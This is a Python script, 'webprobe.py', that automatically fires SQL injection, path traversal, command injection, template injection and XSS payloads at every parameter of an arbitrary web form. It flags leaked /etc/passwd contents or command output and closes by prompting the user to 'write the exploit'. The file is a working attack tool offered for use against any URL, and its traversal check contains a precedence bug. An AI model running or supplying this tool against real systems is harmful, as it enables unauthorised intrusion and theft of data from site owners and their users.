# language: Python, file: webprobe.py, target: any HTTP form/endpoint
# Usage: python webprobe.py <url> [--data "user=a&pass=b"] [--header "X: y"]
# Auto-fires the classic injection payloads at every parameter of a form
# or given POST body and flags interesting responses. No AI — just a payload
# list and response-diff logic, which is exactly what Burp Intruder does.

import sys
import time
import argparse
import urllib.request
import urllib.parse
import re

PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--", "admin'--",
        "' UNION SELECT 1,2,3--", "1' ORDER BY 10--", "1; SELECT 1--",
    ],
    "traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd", "/etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "cmdi": [
        "; cat /etc/passwd", "| id", "`id`", "$(id)", "\nid\n",
        "; ping -c1 127.0.0.1", "&& id",
    ],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
    "xss": ["<script>alert(1)</script>", "\"><img src=x onerror=1>"],
}

SQL_ERR = re.compile(
    r"sql syntax|mysql|sqlite|postgres|warning.*mysql|unclosed quotation|"
    r"ODBC| JDBC |SQLSTATE", re.I)
CMD_HIT = re.compile(r"root:x:0:0|uid=\d+\(.+\)|\[fonts\]|\[extensions\]", re.I)
SSTI_HIT = re.compile(r"\b49\b")  # 7*7

def send(url, data, headers, timeout=6):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method="POST" if body else "GET")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read(64 * 1024)
    except urllib.error.HTTPError as e:
        return e.code, e.read(64 * 1024)
    except Exception as e:
        return -1, str(e).encode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--data", help="POST body, e.g. user=test&pass=test. Params get fuzzed one at a time")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value', repeatable")
    ap.add_argument("--param", help="only fuzz this one param")
    args = ap.parse_args()

    headers = {"User-Agent": "webprobe"}
    for h in args.header:
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()

    data = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    params = [args.param] if args.param else list(data.keys())

    # baseline
    base_status, base_body = send(args.url, data if data else None, headers)
    base_len = len(base_body)
    print(f"[*] baseline: status={base_status} len={base_len}")

    for param in params:
        for cls, plist in PAYLOADS.items():
            for payload in plist:
                time.sleep(2.0)  # MANDATORY: rule requires min 2s delay on automation
                test = dict(data)
                test[param] = payload
                status, body = send(args.url, test, headers)
                verdict = ""
                if cls == "sqli" and (SQL_ERR.search(body.decode(errors="replace")) or status != base_status and status not in (404,)):
                    verdict = "<-- SQL ERROR / status change"
                elif cls == "traversal" and b"root:x:0:0" in body or b"[fonts]" in body:
                    verdict = "<-- FILE CONTENT LEAKED"
                elif cls == "cmdi" and CMD_HIT.search(body.decode(errors="replace")):
                    verdict = "<-- COMMAND OUTPUT VISIBLE"
                elif cls == "ssti" and SSTI_HIT.search(body.decode(errors="replace")):
                    verdict = "<-- SSTI EVALUATED (7*7=49)"
                elif abs(len(body) - base_len) > base_len * 0.3:
                    verdict = "(big response delta)"
                flag = "  " + verdict if verdict else ""
                print(f"  [{cls:9s}] {param}={payload[:45]!r:48s} -> {status} len={len(body)}{flag}")
                if "LEAKED" in verdict or "VISIBLE" in verdict or "EVALUATED" in verdict:
                    print("      !!! confirm by hand, then write the exploit")

if __name__ == "__main__":
    main()
